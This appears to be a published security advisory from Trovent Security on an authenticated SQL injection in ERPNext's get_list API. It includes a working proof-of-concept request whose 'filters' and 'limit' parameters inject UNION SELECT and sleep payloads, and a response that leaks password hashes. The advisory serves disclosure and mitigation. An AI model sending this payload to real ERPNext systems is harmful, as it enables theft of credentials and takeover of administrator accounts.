@@ -1,0 +1,105 @@
+id: 36234
+date: 05/12/2021
+title: ERPNext 12.18.0 / 13.0.0 SQL Injection Vulnerability
+author: Stefan Pietsch
+cves: 
+
+Authenticated SQL injection in ERPNext 13.0.0/12.18.0
+#####################################################
+
+
+Overview
+########
+
+Advisory version: 1.0
+Advisory status: Public
+Advisory URL: https://trovent.io/security-advisory-2103-01
+Affected product: ERPNext
+Tested versions: 12.18.0 and 13.0.0 beta
+Vendor: Frappé Technologies https://frappe.io
+Credits: Trovent Security GmbH, Nick Decker, Stefan Pietsch
+
+
+Detailed description
+####################
+
+Trovent Security GmbH discovered an SQL Injection vulnerability
+in the "frappe.model.db_query.get_list" API endpoint.
+On version 13.0.0 valid credentials without any privileges are sufficient
+but on version 12.18.0 at least "system_user" privileges are required.
+The vulnerable parameter "filters" allows injection of SQL statements.
+An attacker is able to query all available database tables to retrieve
+usernames, password hashes or password reset tokens which can then be used
+to reset administrator passwords.
+
+
+Severity: High
+CVSS Score: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
+CWE ID: 89
+CVE ID: TBD
+
+
+Proof of concept
+################
+
+Sample request made with a non system account to retrieve password hashes:
+
+REQUEST:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+GET /api/method/frappe.model.db_query.get_list?filters=%7b%22name%20UNION%20SELECT%20password%20from%20%60__Auth%60%20--%20%22%3a%20%22administrator%22%7d&fields=%5b%22name%22%5d&doctype=User&limit=20'%3b%20do%20sleep(10)&order_by=name&_=1615372773071 HTTP/1.1
+Host: erpnext.local
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: application/json
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Frappe-CSRF-Token: 0e89c5c43898da856fe12e19a57991d7bdf380477d0354f93ce6bcf3
+X-Frappe-CMD:
+X-Frappe-Doctype: Dashboard%20Settings
+X-Requested-With: XMLHttpRequest
+Connection: close
+Referer: http://erpnext.local/app/website
+Cookie: io=NVosyhHCvV3KdkxNAAi7; sid=26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22; system_user=no; full_name=auth%20test%27; user_id=auth%40trovent.io; user_image=
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+
+RESPONSE:
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+HTTP/1.1 200 OK
+Server: nginx/1.19.7
+Date: Wed, 10 Mar 2021 16:04:40 GMT
+Content-Type: application/json
+Connection: close
+Vary: Accept-Encoding
+Set-Cookie: sid=26f7ddefef642c0f88b9babfc26b751229c32b565304f30815d8ec22; Expires=Sat, 13-Mar-2021 16:04:40 GMT; HttpOnly; Path=/; SameSite=Lax
+Set-Cookie: system_user=no; Path=/; SameSite=Lax
+Set-Cookie: full_name=auth%20test%27; Path=/; SameSite=Lax
+Set-Cookie: user_id=auth%40trovent.io; Path=/; SameSite=Lax
+Set-Cookie: user_image=; Path=/; SameSite=Lax
+X-Frame-Options: SAMEORIGIN
+Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
+X-Content-Type-Options: nosniff
+X-XSS-Protection: 1; mode=block
+Content-Length: 719
+
+{"message":[{"name":"$pbkdf2-sha256$29000$0fofo/SeE0IoRQgh5HyvVQ$IuyDVu5v4Hc4Z7Pe/3Tvpim7AdhbYrI9b9XXL39/tVU"},{"name":"$pbkdf2-sha256$29000$1vqfk3KO0ZqT8n7vvff.nw$A9a6k9wbegrw5QUiJ/jj1.kXCr.lwRSJtv5S7QTCQgU"},{"name":"$pbkdf2-sha256$29000$aA2B8P7/X.vd./.fM6aUkg$JluCIXXrUgKxTUwvRyveCRIDjJ0mhhoG9Cs6onAO2Do"},{"name":"$pbkdf2-sha256$29000$CSFEKCVEqPVe611rrdVayw$pFf/iBuprNIdZ4DoJadro0UUNaffy.2v5EbAe4Nbxco"},{"name":"$pbkdf2-sha256$29000$L2WMkdLaG2NM6V3rnXMOAQ$snURvXF1kNTGA7Zux.HLoQ5JISRajyOBiAZ1VDjEJnc"},{"name":"$pbkdf2-sha256$29000$r/UeQ.id0/rfm9M6Z4yR8g$1w/oAvTRNJ7wKuSHgZ.4jkDHQAvLLYxerzYeHpd1IV8"},{"name":"gAAAAABgP1dTiYpJ67JyyUjytcay4XmKoOuyf_jAke7slDwL4gIM5lCWCbu6SjYOPOX6WigAm0fZzGgTEIiXNCA_yPZI64ijmA=="}]}
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+Solution / Workaround
+#####################
+
+To mitigate this vulnerability, we recommend to limit access to the affected API endpoint.
+As a permanent solution it is recommended not to insert user input directly into SQL queries.
+
+#  0day.today [2023-03-26]  #
